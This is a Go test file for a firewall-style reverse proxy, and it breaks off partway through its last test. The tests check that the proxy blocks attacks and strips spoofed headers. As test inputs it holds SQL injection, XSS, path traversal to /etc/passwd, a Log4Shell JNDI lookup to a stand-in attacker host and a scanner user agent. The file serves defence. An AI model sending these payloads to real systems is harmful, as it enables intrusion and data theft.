// SPDX-License-Identifier: Apache-2.0

package proxy

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/YurilLAB/coraza/carnical/alert"
	"github.com/YurilLAB/coraza/carnical/bots"
	"github.com/YurilLAB/coraza/carnical/challenge"
	"github.com/YurilLAB/coraza/carnical/crs"
	"github.com/YurilLAB/coraza/carnical/inspect"
	"github.com/YurilLAB/coraza/carnical/shield"
)

// seen is what the application behind the proxy received.
type seen struct {
	RequestURI string
	Host       string
	Header     http.Header
	Trailer    http.Header
	Body       []byte
}

type upstream struct {
	*httptest.Server
	mu   sync.Mutex
	all  []seen
	hold chan struct{} // when set, handlers wait for it to be closed
}

func (u *upstream) requests() []seen {
	u.mu.Lock()
	defer u.mu.Unlock()
	return append([]seen(nil), u.all...)
}

func newUpstream(t testing.TB) *upstream {
	t.Helper()
	u := &upstream{}
	u.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		u.mu.Lock()
		u.all = append(u.all, seen{r.RequestURI, r.Host, r.Header.Clone(), r.Trailer.Clone(), body})
		hold := u.hold
		u.mu.Unlock()
		if hold != nil {
			<-hold
		}
		w.Header().Set("Content-Type", "text/plain")
		// What a few paths make the application do, for the tests of the response policy.
		switch {
		case r.URL.Path == "/set-cookie":
			http.SetCookie(w, &http.Cookie{Name: "session", Value: "abc"})
		case r.URL.Path == "/php-session":
			for _, c := range r.Header.Values("X-Set-Cookie") {
				w.Header().Add("Set-Cookie", c)
			}
		case r.URL.Path == "/banner":
			w.Header().Set("X-Powered-By", "PHP/8.3.1")
			w.Header().Set("Server", "Apache/2.4.58 (Ubuntu)")
		case strings.HasSuffix(r.URL.Path, ".css"):
			w.Header().Set("Content-Type", "text/html")
		case r.URL.Path == "/early-hints":
			w.Header().Set("X-Gate-Only-Early", "for the check")
			w.WriteHeader(http.StatusEarlyHints)
			w.Header().Del("X-Gate-Only-Early")
		case r.URL.Path == "/trailers":
			// Trailers after the body, one announced and one not, as gRPC and a few sites send them.
			w.Header().Set("Trailer", "X-Gate-Only, Grpc-Status")
			_, _ = w.Write([]byte("reached the application"))
			w.(http.Flusher).Flush()
			w.Header().Set("X-Gate-Only", "for the check")
			w.Header().Set("Grpc-Status", "0")
			w.Header().Set(http.TrailerPrefix+"x-gate-only-too", "for the check")
			return
		case r.URL.Path == "/cut":
			// An application that dies part way through the body it announced.
			w.Header().Set("Content-Length", "1000")
			w.Write([]byte("part of a body"))
			w.(http.Flusher).Flush()
			panic(http.ErrAbortHandler)
		}
		w.Write([]byte("reached the application"))
	}))
	t.Cleanup(u.Close)
	return u
}

// The test upstreams are on the loopback address, which the edge refuses unless it is allowed.
var loopback = OriginPolicy{Allow: []netip.Prefix{netip.MustParsePrefix("127.0.0.0/8"), netip.MustParsePrefix("::1/128")}}

type setup struct {
	cfg  Config
	up   *upstream
	addr string
	edge *Edge
}

func start(t testing.TB, change func(*Config)) *setup {
	t.Helper()
	up := newUpstream(t)
	target, _ := url.Parse(up.URL)
	cfg := Config{Upstream: target, CRS: crs.DefaultSettings(), Origin: loopback}
	if change != nil {
		change(&cfg)
	}
	e, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { e.Close() })
	srv := httptest.NewUnstartedServer(nil)
	srv.Config = e.Server("") // the same limits and settings as a real server
	srv.Start()
	t.Cleanup(srv.Close)
	return &setup{cfg, up, strings.TrimPrefix(srv.URL, "http://"), e}
}

// raw sends exactly these bytes and returns the status of the first response and the whole reply.
func (s *setup) raw(t testing.TB, data string) (int, string) {
	t.Helper()
	return s.rawFor(t, 5*time.Second, data)
}

// rawFor is raw with a limit on how long to wait for the reply (a slow machine, or the race detector, needs more).
func (s *setup) rawFor(t testing.TB, wait time.Duration, data string) (int, string) {
	t.Helper()
	conn, err := net.DialTimeout("tcp", s.addr, 3*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(wait))
	if _, err := conn.Write([]byte(data)); err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	io.Copy(&out, conn)
	reply := out.String()
	status := 0
	if resp, err := http.ReadResponse(bufio.NewReader(strings.NewReader(reply)), nil); err == nil {
		status = resp.StatusCode
	}
	return status, reply
}

func get(target string, headers ...string) string {
	return "GET " + target + " HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: text/html\r\n" +
		strings.Join(headers, "") + "Connection: close\r\n\r\n"
}

func TestClaimedHeadersNeverReachTheApplicationAndCannotReplaceTheVisitorsAddress(t *testing.T) {
	claims := []string{"X-Original-URL", "X_Original_URL", "X-Rewrite-URL", "X_Rewrite_URL", "X-Forwarded-For", "X_Forwarded_For",
		"X-Real-IP", "X_Real_IP", "Client-IP", "True-Client-IP", "CF-Connecting-IP", "Forwarded", "X-Forwarded-Host", "X_Forwarded_Host",
		"X-Envoy-External-Address", "X-Azure-ClientIP", "X-Host", "Front-End-Https", "Proxy"}
	canonical := map[string]string{"x-forwarded-for": "127.0.0.1", "x-real-ip": "127.0.0.1", "x-forwarded-proto": "http", "x-forwarded-host": "shop.example.test"}
	for _, claim := range claims {
		t.Run(claim, func(t *testing.T) {
			s := start(t, nil)
			status, _ := s.raw(t, get("/page", claim+": 6.6.6.6\r\n", "X_Application_Token: keep\r\n"))
			got := s.up.requests()
			if status == 403 {
				// The rule set itself refused it (the CRS blocks the httpoxy "Proxy" header, for one).
				if len(got) != 0 {
					t.Fatalf("refused, yet %d requests reached the application", len(got))
				}
				return
			}
			if status != 200 || len(got) != 1 {
				t.Fatalf("status %d, %d requests", status, len(got))
			}
			for name, values := range got[0].Header {
				dashed := strings.ReplaceAll(strings.ToLower(name), "_", "-")
				if want, ok := canonical[dashed]; ok {
					if len(values) != 1 || values[0] != want || name != http.CanonicalHeaderKey(dashed) {
						t.Errorf("%s = %v, want exactly %q", name, values, want)
					}
				} else if dashed == strings.ReplaceAll(strings.ToLower(claim), "_", "-") {
					t.Errorf("%s reached the application with %v", name, values)
				}
			}
			if got[0].Header.Get("X_application_token") == "" {
				t.Error("an ordinary header with underscores was dropped")
			}
		})
	}
}

func TestTheTargetReachesTheApplicationExactlyAsSent(t *testing.T) {
	// The three targets with an encoded slash or a path parameter are refused by default (see TestPathPolicy), so they
	// are sent to an edge that has been told to allow them.
	s := start(t, func(c *Config) { c.Paths = PathPolicy{AllowEncodedSlash: true, AllowPathParams: true} })
	for _, target := range []string{
		"/", "/a/b/c", "/a%2fb", "/a%2Fb?x=%2f", "/a;b=c/d", "/caf%C3%A9", "/a?x=1&x=2", "/a?%78=1", "/a%20b?q=a+b",
		"/a?", "/a?x", "/a?x=%zz&y=1", "/search?q=ordinary&page=2",
	} {
		before := len(s.up.requests())
		if status, reply := s.raw(t, get(target)); status != 200 {
			t.Errorf("%s: status %d\n%.200s", target, status, reply)
			continue
		}
		got := s.up.requests()
		if len(got) != before+1 || got[before].RequestURI != target {
			t.Errorf("sent %q, the application received %q", target, got[len(got)-1].RequestURI)
		}
	}
}

// ticking makes every reading of the edge's clock a second after the last, so that no line sampled once a second is held back.
func ticking(e *Edge) {
	var now atomic.Int64
	e.now = func() int64 { return now.Add(int64(time.Second)) }
}

func TestTargetsThatCouldNotBeForwardedUnchangedAreRefused(t *testing.T) {
	var seen refusals
	s := start(t, func(c *Config) { c.OnMatch = seen.record })
	ticking(s.edge)
	for _, tc := range []struct {
		name, data string
		id         int
	}{
		{"absolute form", "GET http://shop.example.test/page HTTP/1.1\r\nHost: shop.example.test\r\nConnection: close\r\n\r\n", idTarget},
		{"double slash", get("//evil.example/x"), idTarget},
		{"a byte Go would re-encode", get("/a%2fb|"), idTarget},
		{"a caret", get("/a^b"), idTarget},
		{"CONNECT", "CONNECT shop.example.test:443 HTTP/1.1\r\nHost: shop.example.test:443\r\nConnection: close\r\n\r\n", idConnect},
		{"asterisk", "OPTIONS * HTTP/1.1\r\nHost: shop.example.test\r\nConnection: close\r\n\r\n", idTarget},
	} {
		t.Run(tc.name, func(t *testing.T) {
			before := seen.count(tc.id)
			if status, _ := s.raw(t, tc.data); status == 200 || status == 0 {
				t.Fatalf("status %d", status)
			}
			if n := seen.count(tc.id) - before; n != 1 {
				t.Fatalf("recorded %d lines of rule %d, want one", n, tc.id)
			}
		})
	}
	if n := len(s.up.requests()); n != 0 {
		t.Fatalf("%d refused requests reached the application", n)
	}
	// Nothing has limited these requests yet, so a client can send them as fast as it likes: one line a second, and the ones
	// not logged are counted in a line of their own within a second or so, and at close.
	t.Run("a flood of them is logged once a second and counted", func(t *testing.T) {
		var seen matches
		s := start(t, func(c *Config) { c.OnMatch = seen.record })
		var now atomic.Int64
		s.edge.now = now.Load
		for range 3 {
			s.raw(t, get("//evil.example/x"))
		}
		for deadline := time.Now().Add(5 * time.Second); len(seen.all()) < 2; time.Sleep(10 * time.Millisecond) {
			if time.Now().After(deadline) {
				t.Fatalf("the count was not logged on its own: %+v", seen.all())
			}
		}
		now.Add(int64(time.Second))
		for range 4 {
			s.raw(t, "CONNECT shop.example.test:443 HTTP/1.1\r\nHost: shop.example.test:443\r\nConnection: close\r\n\r\n")
		}
		if err := s.edge.Close(); err != nil {
			t.Fatal(err)
		}
		var got []string
		for _, m := range seen.all() {
			if !m.Disruptive || m.TransactionID == "" && !strings.HasSuffix(m.Message, " more refusals not logged)") {
				t.Errorf("a line %+v", m)
			}
			got = append(got, fmt.Sprint(m.RuleID, " ", m.Message))
		}
		want := []string{"5000072 a request target that cannot be forwarded unchanged: not an origin-form target",
			"5000072 a request target that cannot be forwarded unchanged (2 more refusals not logged)",
			"5000070 a CONNECT request", "5000070 a CONNECT request (3 more refusals not logged)"}
		if strings.Join(got, "\n") != strings.Join(want, "\n") {
			t.Fatalf("logged %q, want %q", got, want)
		}
	})
}

func TestProtocolUpgradesAreRefused(t *testing.T) {
	var seen refusals
	s := start(t, func(c *Config) { c.OnMatch = seen.record })
	ticking(s.edge)
	for name, headers := range map[string][]string{
		"websocket":                   {"Connection: Upgrade\r\n", "Upgrade: websocket\r\n", "Sec-WebSocket-Key: x\r\n", "Sec-WebSocket-Version: 13\r\n"},
		"h2c":                         {"Connection: Upgrade, HTTP2-Settings\r\n", "Upgrade: h2c\r\n", "HTTP2-Settings: AAMAAABkAAQAAP__\r\n"},
		"upgrade without Connection":  {"Upgrade: websocket\r\n"},
		"Connection on a second line": {"Connection: keep-alive\r\n", "Connection: Upgrade\r\n", "Upgrade: websocket\r\n"},
	} {
		t.Run(name, func(t *testing.T) {
			before := seen.count(idUpgrade)
			if status, _ := s.raw(t, get("/ws", headers...)); status != http.StatusNotImplemented || seen.count(idUpgrade) != before+1 {
				t.Fatalf("status %d, %d lines of rule %d recorded; want 501 and one", status, seen.count(idUpgrade)-before, idUpgrade)
			}
		})
	}
	if n := len(s.up.requests()); n != 0 {
		t.Fatalf("%d upgrade requests reached the application", n)
	}
	t.Run("an allowed upgrade is tunnelled, past a person check that reads trailers, and its connection counted", func(t *testing.T) {
		app := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Header.Get("Upgrade") == "" {
				return // an ordinary request: 200
			}
			conn, brw, err := http.NewResponseController(w).Hijack()
			if err != nil {
				return
			}
			defer conn.Close()
			brw.WriteString("HTTP/1.1 101 Switching Protocols\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\n")
			brw.Flush()
			line, _ := brw.ReadString('\n')
			brw.WriteString("echo " + line)
			brw.Flush()
			brw.ReadString('\n') // hold the tunnel open until the client closes it
		}))
		defer app.Close()
		s := start(t, func(c *Config) {
			c.AllowUpgrade, c.MaxConnsPerIP, c.Upstream, c.Challenge = true, 1, mustURL(app.URL), &gate{}
		})
		conn, err := net.DialTimeout("tcp", s.addr, 3*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		defer conn.Close()
		conn.SetDeadline(time.Now().Add(5 * time.Second))
		fmt.Fprint(conn, "GET /ws HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: */*\r\n"+
			"Connection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n")
		r := bufio.NewReader(conn)
		resp, err := http.ReadResponse(r, nil)
		if err != nil || resp.StatusCode != http.StatusSwitchingProtocols {
			t.Fatalf("upgrade: %v %v", resp, err)
		}
		fmt.Fprint(conn, "ping\n")
		if line, _ := r.ReadString('\n'); line != "echo ping\n" {
			t.Fatalf("through the tunnel: %q", line)
		}
		if status, _ := s.raw(t, get("/page")); status != 0 {
			t.Fatalf("a second connection from the address was served (%d) while its tunnel was open", status)
		}
		conn.Close()
		deadline := time.Now().Add(3 * time.Second)
		for status, _ := s.raw(t, get("/page")); status != http.StatusOK; status, _ = s.raw(t, get("/page")) {
			if time.Now().After(deadline) {
				t.Fatalf("after the tunnel closed, a new connection got %d", status)
			}
			time.Sleep(20 * time.Millisecond)
		}
	})
	// A browser fails a handshake that is not switched, so a page in answer to one is only of use to a program that dressed
	// a request as a handshake to pass the bot checks (bots.Classify): the page is withheld, a refusal kept.
	for _, tt := range []struct {
		name   string
		status int // what the application answers the handshake with
		want   int
	}{
		{"a handshake answered with a page gets no page", http.StatusOK, http.StatusBadGateway},
		{"or with a redirect", http.StatusFound, http.StatusBadGateway},
		{"a handshake the application refuses keeps its answer", http.StatusForbidden, http.StatusForbidden},
	} {
		t.Run(tt.name, func(t *testing.T) {
			app := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Location", "/elsewhere")
				w.WriteHeader(tt.status)
				fmt.Fprint(w, "the account page")
			}))
			defer app.Close()
			var seen refusals
			s := start(t, func(c *Config) { c.AllowUpgrade = true; c.Upstream = mustURL(app.URL); c.OnMatch = seen.record })
			status, reply := s.raw(t, get("/account", "Connection: Upgrade\r\n", "Upgrade: websocket\r\n",
				"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n", "Sec-WebSocket-Version: 13\r\n", "Origin: http://shop.example.test\r\n"))
			if status != tt.want || tt.want == http.StatusBadGateway && (strings.Contains(reply, "account page") || seen.count(idSocketNotSwitched) != 1) {
				t.Fatalf("status %d, want %d, %d refusals recorded:\n%.300s", status, tt.want, seen.count(idSocketNotSwitched), reply)
			}
		})
	}
}

func TestTrailersAreNotForwarded(t *testing.T) {
	s := start(t, nil)
	data := "POST /submit HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: text/html\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTrailer: X-Original-URL, X-Late\r\nConnection: close\r\n\r\n" +
		"6\r\na=1&b=\r\n1\r\n2\r\n0\r\nX-Original-URL: /admin\r\nX-Late: hello\r\n\r\n"
	if status, reply := s.raw(t, data); status != 200 {
		t.Fatalf("status %d\n%.300s", status, reply)
	}
	got := s.up.requests()
	if len(got) != 1 || len(got[0].Trailer) != 0 || got[0].Header.Get("X-Original-Url") != "" || got[0].Header.Get("X-Late") != "" {
		t.Fatalf("trailers reached the application: %+v", got)
	}
	if string(got[0].Body) != "a=1&b=2" {
		t.Fatalf("body changed: %q", got[0].Body)
	}
}

func TestClientIdentity(t *testing.T) {
	trusted, err := ParseTrusted("10.0.0.0/8, 2001:db8:ff::/48")
	if err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		name, peer string
		chain      []string
		want       string
		bad        bool
	}{
		{"direct visitor claiming another address", "203.0.113.10:1234", []string{"198.51.100.90"}, "203.0.113.10", false},
		{"direct visitor sending garbage", "203.0.113.10:1234", []string{"junk"}, "203.0.113.10", false},
		{"visitor behind a trusted proxy", "10.0.0.1:1234", []string{"198.51.100.10, 10.0.0.2"}, "198.51.100.10", false},
		{"a forged address on the left is ignored", "10.0.0.1:1234", []string{"1.2.3.4, 198.51.100.10, 10.0.0.2"}, "198.51.100.10", false},
		{"several header lines are one chain", "10.0.0.1:1234", []string{"198.51.100.10", "203.0.113.7, 10.0.0.2"}, "203.0.113.7", false},
		{"trusted proxy sent no chain", "10.0.0.1:1234", nil, "10.0.0.1", false},
		{"garbage at the end of a trusted chain", "10.0.0.1:1234", []string{"198.51.100.10, junk"}, "", true},
		{"empty entry", "10.0.0.1:1234", []string{"198.51.100.10,"}, "", true},
		{"a port is not an address", "10.0.0.1:1234", []string{"198.51.100.10:80"}, "", true},
		{"an IPv4-mapped address is the IPv4 address", "10.0.0.1:1234", []string{"::ffff:198.51.100.10"}, "198.51.100.10", false},
		{"IPv6 behind a trusted IPv6 proxy", "[2001:db8:ff::5]:1234", []string{"2001:db8:1::9"}, "2001:db8:1::9", false},
		{"a chain made only of trusted proxies", "10.0.0.1:1234", []string{"10.0.0.9, 10.0.0.2"}, "10.0.0.9", false},
		{"a chain over 64 entries", "10.0.0.1:1234", []string{strings.Repeat("1.1.1.1,", 70) + "1.1.1.1"}, "", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := httptest.NewRequest("GET", "/", nil)
			r.RemoteAddr = tc.peer
			for _, line := range tc.chain {
				r.Header.Add("X-Forwarded-For", line)
			}
			addr, _, err := clientAddr(r, trusted)
			if (err != nil) != tc.bad {
				t.Fatalf("error = %v", err)
			}
			if !tc.bad && addr.String() != tc.want {
				t.Fatalf("got %s, want %s", addr, tc.want)
			}
		})
	}
}

func TestTrustedProxyRangesAreChecked(t *testing.T) {
	for _, bad := range []string{"0.0.0.0/0", "::/0", "::ffff:10.0.0.0/104", "10.0.0.0/33", "not-an-address", "fe80::1%eth0"} {
		if _, err := ParseTrusted(bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	for _, good := range []string{"10.0.0.1", "10.0.0.0/8", "0.0.0.0/1", "2001:db8::/32", "127.0.0.1, ::1"} {
		if _, err := ParseTrusted(good); err != nil {
			t.Errorf("%q refused: %v", good, err)
		}
	}
	trusted, _ := ParseTrusted("127.0.0.1")
	s := start(t, func(c *Config) { c.TrustedProxies = trusted })
	s.raw(t, get("/page", "X-Forwarded-For: 198.51.100.10\r\n"))
	got := s.up.requests()
	if len(got) != 1 || got[0].Header.Get("X-Real-Ip") != "198.51.100.10" {
		t.Fatalf("a trusted proxy's visitor address was not used: %+v", got)
	}
	if status, _ := s.raw(t, get("/page", "X-Forwarded-For: garbage\r\n")); status != http.StatusBadRequest {
		t.Fatalf("garbage from a trusted proxy: %d, want 400", status)
	}
	var invalid = netip.MustParsePrefix("0.0.0.0/0")
	target, _ := url.Parse("http://127.0.0.1:1")
	if _, err := New(Config{Upstream: target, CRS: crs.DefaultSettings(), Origin: loopback, TrustedProxies: []netip.Prefix{invalid}}); err == nil {
		t.Fatal("New accepted a /0 trusted range")
	}
}

func TestTheUpstreamAddressIsChecked(t *testing.T) {
	for _, bad := range []string{"ftp://x", "http://", "http://u:p@host", "http://host/app", "http://host?x=1", "http://host#f", "file:///etc/passwd", "//host", ""} {
		u, _ := url.Parse(bad)
		if _, err := New(Config{Upstream: u, CRS: crs.DefaultSettings()}); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	for _, good := range []string{"http://127.0.0.1:8080", "https://origin.example.com", "http://origin.example.com/"} {
		u, _ := url.Parse(good)
		e, err := New(Config{Upstream: u, CRS: crs.DefaultSettings(), Origin: loopback})
		if err != nil {
			t.Errorf("%q refused: %v", good, err)
			continue
		}
		e.Close()
	}
	if _, err := New(Config{Upstream: &url.URL{Scheme: "http", Host: "h"}, CRS: crs.Settings{}}); err == nil {
		t.Error("empty CRS settings accepted")
	}
}

func TestAttacksAreStoppedAndTheApplicationNeverHearsOfThem(t *testing.T) {
	s := start(t, nil)
	post := func(target, contentType, body string) string {
		return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: text/html\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
			target, contentType, len(body), body)
	}
	attacks := map[string]string{
		"sql injection":      get("/search?q=" + url.QueryEscape("1' OR '1'='1' --")),
		"xss":                get("/search?q=" + url.QueryEscape("<script>alert(1)</script>")),
		"path traversal":     get("/download?f=" + url.QueryEscape("../../../../etc/passwd")),
		"log4shell":          get("/", "X-Api-Version: ${jndi:ldap://evil.example/a}\r\n"),
		"scanner":            get("/", "User-Agent: sqlmap/1.7\r\n"),
		"json sql injection": post("/api", "application/json", `{"q":"1' OR '1'='1' --"}`),
		"form sql injection": post("/login", "application/x-www-form-urlencoded", "user=admin'--&pass=x"),
	}
	for name, data := range attacks {
		if status, _ := s.raw(t, data); status != 403 {
			t.Errorf("%s: status %d, want 403", name, status)
		}
	}
	if n := len(s.up.requests()); n != 0 {
		t.Fatalf("%d attacks reached the application", n)
	}
	// And ordinary traffic still passes, with the body intact.
	body := "name=Alice&note=" + url.QueryEscape("O'Brien said: 100% sure, see https://example.com/a?b=c")
	if status, reply := s.raw(t, post("/profile", "application/x-www-form-urlencoded", body)); status != 200 {
		t.Fatalf("ordinary form: %d\n%.300s", status, reply)
	}
	got := s.up.requests()
	if len(got) != 1 || string(got[0].Body) != body {
		t.Fatalf("the body changed on the way: %+v", got)
	}
}

func TestMatchesAreReportedWithoutWhatTheVisitorSentUnlessAsked(t *testing.T) {
	var mu sync.Mutex
	var plain, detailed []Match
	collect := func(into *[]Match) func(Match) {
		return func(m Match) { mu.Lock(); *into = append(*into, m); mu.Unlock() }
	}
	const expanded = "SecRule ARGS:note \"@rx .\" \"id:5000099,phase:2,deny,status:403,log,msg:'request=%{ARGS.note}',logdata:'%{ARGS.note}',tag:'carnical-deny'\""
	// An inspector that only watches, so that the attack is reported by an inspector as well as by the rule set.
	watch := fakeInspector{"watcher", func(r *inspect.Request) inspect.Result {
		if r.Path == "/search" {
			return inspect.Result{Verdicts: []inspect.Verdict{{ID: 5001002, Message: "a search", Severity: "low"}}}
		}
		return inspect.Result{}
	}}
	a := start(t, func(c *Config) {
		c.OnMatch = collect(&plain)
		c.CRS.After = expanded
		c.Inspectors = []inspect.Inspector{watch}
	})
	b := start(t, func(c *Config) { c.OnMatch = collect(&detailed); c.CRS.After = expanded; c.LogDetails = true })
	secret := "SECRETMARK-4711"
	attack := get("/search?q=" + url.QueryEscape("1' OR '"+secret+"'='"+secret+"' --"))
	a.raw(t, attack)
	b.raw(t, attack)
	if status, _ := a.raw(t, get("/search?q="+url.QueryEscape("' or true() or '"+secret+"'='b"))); status != 403 {
		t.Fatalf("local rule status %d", status)
	}
	// A request the rules only score (920350, a numeric Host) and let through.
	if status, _ := a.raw(t, strings.Replace(get("/page"), "Host: shop.example.test", "Host: 127.0.0.1", 1)); status != 200 {
		t.Fatalf("numeric Host status %d", status)
	}
	// A body the engine cannot take apart refuses on its own (Coraza's base rule 200002), and only while it enforces.
	var detected []Match
	dt := start(t, func(c *Config) { c.OnMatch = collect(&detected); c.CRS.Mode = crs.ModeDetect })
	badJSON := "POST /api HTTP/1.1\r\n" + preamble + "Content-Type: application/json\r\nContent-Length: 1\r\nConnection: close\r\n\r\n{"
	if status, _ := a.raw(t, badJSON); status != 400 {
		t.Fatalf("malformed JSON status %d", status)
	}
	if status, _ := dt.raw(t, badJSON); status != 200 {
		t.Fatalf("malformed JSON in detection mode: status %d", status)
	}
	// With early blocking on, the rule set refuses in phase 1 with 949111, after more lines than a request is reported in.
	var early []Match
	earlyRules := []string{`SecAction "id:900120,phase:1,pass,nolog,t:none,setvar:tx.early_blocking=1"`}
	for i := range 40 {
		earlyRules = append(earlyRules, fmt.Sprintf(`SecRule REQUEST_HEADERS:User-Agent "@rx ." "id:%d,phase:1,pass,log"`, 10001+i))
	}
	eb := start(t, func(c *Config) { c.OnMatch = collect(&early); c.CRS.Before = strings.Join(earlyRules, "\n") })
	if status, _ := eb.raw(t, strings.Replace(get("/page"), "Mozilla/5.0 Chrome/120", "sqlmap/1.4", 1)); status != 403 {
		t.Fatalf("a scanner with early blocking: status %d", status)
	}
	// Macro-expanded messages can contain request data even when logdata and URI are omitted.
	for _, s := range []*setup{a, b} {
		if status, _ := s.raw(t, get("/profile?note="+secret)); status != 403 {
			t.Fatalf("macro rule status %d", status)
		}
		s.up.Close()
		if status, _ := s.raw(t, get("/health?trace="+secret)); status != 502 {
			t.Fatalf("unavailable origin status %d", status)
		}
	}
	// What the visitor sent is cut in a detailed line, which says so.
	if status, _ := b.raw(t, get("/profile?note="+secret+strings.Repeat("x", 2000))); status != 403 {
		t.Fatalf("macro rule status %d", status)
	}
	// One request that matches more rules than a request is reported in: the lines past the cap are counted in one line,
	// and the line of the rule that refuses the request is never held back. In detection mode the request is let through,
	// and the lines of the rules that would have refused it, the anomaly verdict and a rule tagged carnical-deny, are not
	// held back either.
	var capped, cappedDetect []Match
	many := make([]string, 0, 41)
	for i := range 40 {
		many = append(many, fmt.Sprintf(`SecRule ARGS:x "@rx ." "id:%d,phase:1,pass,log"`, 10001+i))
	}
	many = append(many, `SecRule ARGS:x "@rx ." "id:10100,phase:2,deny,status:403,log,tag:'carnical-deny'"`)
	c := start(t, func(c *Config) { c.OnMatch = collect(&capped); c.CRS.After = strings.Join(many, "\n") })
	if status, _ := c.raw(t, get("/page?x=1")); status != 403 {
		t.Fatalf("many rules status %d", status)
	}
	cd := start(t, func(c *Config) {
		c.OnMatch = collect(&cappedDetect)
		c.CRS.After = strings.Join(many, "\n")
		c.CRS.Mode = crs.ModeDetect
	})
	if status, _ := cd.raw(t, get("/page?x=1&q="+url.QueryEscape("1' OR '1'='1' --"))); status != 200 {
		t.Fatalf("many rules in detection mode: status %d", status)
	}
	// The lines about the edge itself, which are about no one request, carry their kind and risk too.
	var own []Match
	o := start(t, func(c *Config) { c.OnMatch = collect(&own) })
	o.edge.reportEval(false, "")
	o.edge.reportEval(true, "")
	o.edge.reportTooManyConns(netip.MustParseAddr("192.0.2.1"))
	o.edge.reportEvicted(int64(time.Hour), 1)
	// With NoRuleMatches only the lines about the edge itself are given.
	var quiet []Match
	d := start(t, func(c *Config) { c.OnMatch = collect(&quiet); c.NoRuleMatches = true })
	if status, _ := d.raw(t, attack); status != 403 {
		t.Fatalf("attack status %d", status)
	}
	d.up.Close()
	if status, _ := d.raw(t, get("/health")); status != 502 {
		t.Fatalf("unavailable origin status %d", status)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(quiet) != 1 || quiet[0].RuleID != idUpstreamFailed {
		t.Errorf("with NoRuleMatches: %+v", quiet)
	}
	if n := len(capped); n != maxRequestLines+2 || capped[n-2].RuleID != 10100 || !capped[n-2].Disruptive || capped[n-1].RuleID != idLinesHeld ||
		capped[n-1].TransactionID != capped[0].TransactionID || !strings.HasSuffix(capped[n-1].Message, " more rule matches not logged") {
		t.Errorf("a request that matched %d rules was reported in %d lines: %+v", len(many), len(capped), capped[max(len(capped)-2, 0):])
	} else if held, _ := strconv.Atoi(strings.Fields(capped[n-1].Message)[0]); held < len(many)-1-maxRequestLines {
		t.Errorf("%d lines said to be held back", held)
	}
	if n := len(cappedDetect); n < maxRequestLines+3 || cappedDetect[n-1].RuleID != idLinesHeld ||
		slices.ContainsFunc(cappedDetect, func(m Match) bool { return m.Disruptive }) ||
		!slices.ContainsFunc(cappedDetect[maxRequestLines:], func(m Match) bool { return m.RuleID == 949110 }) ||
		!slices.ContainsFunc(cappedDetect[maxRequestLines:], func(m Match) bool { return m.RuleID == 10100 }) {
		t.Errorf("in detection mode a request that matched more than %d rules was reported in %d lines, the last ones %+v; want 949110 and 10100 past the cap, none disruptive",
			maxRequestLines, n, cappedDetect[max(n-4, 0):])
	}
	if len(plain) == 0 || len(detailed) == 0 {
		t.Fatalf("no matches reported (%d, %d)", len(plain), len(detailed))
	}
	// Only the rule that refused a request is disruptive: the anomaly verdict, or a rule tagged carnical-deny. The rules that
	// only score it are not, though the engine runs them with a disruptive action while it enforces.
	refusing := map[int]bool{}
	for _, m := range plain {
		if m.Disruptive {
			refusing[m.RuleID] = true
		}
	}
	if !refusing[949110] || !refusing[5000099] || !refusing[200002] || len(refusing) != 4 || !refusing[idUpstreamFailed] ||
		!slices.ContainsFunc(plain, func(m Match) bool { return m.RuleID == 920350 }) {
		t.Errorf("disruptive rules %v, want 949110, 5000099, 200002 and %d, with 920350 matched", refusing, idUpstreamFailed)
	}
	// 949111 is the one disruptive line of a request early blocking refused, is not held back by the cap and is rated as the
	// verdict.
	if i := slices.IndexFunc(early, func(m Match) bool { return m.Disruptive }); i < 0 || early[i].RuleID != 949111 || early[i].Risk != "high" ||
		slices.ContainsFunc(early[i+1:], func(m Match) bool { return m.Disruptive }) {
		t.Errorf("with early blocking the lines end %+v; want 949111 the one disruptive line, rated high", early[max(len(early)-4, 0):])
	}
	// In detection mode nothing refused, so no rule set line is disruptive.
	if !slices.ContainsFunc(detected, func(m Match) bool { return m.RuleID == 200002 }) ||
		slices.ContainsFunc(detected, func(m Match) bool { return m.Disruptive }) {
		t.Errorf("in detection mode: %+v; want 200002 matched and nothing disruptive", detected)
	}
	// Every line names its kind and risk from the alert catalog; a rule that only scores is rated by its severity, the
	// verdict as high.
	kinds := map[int]string{}
	for _, m := range slices.Concat(plain, capped, cappedDetect, early) {
		if m.Risk == "" {
			t.Errorf("a match without a risk: %+v", m)
			break
		}
	}
	for _, m := range plain {
		kinds[m.RuleID] = m.Category + "/" + m.Risk
	}
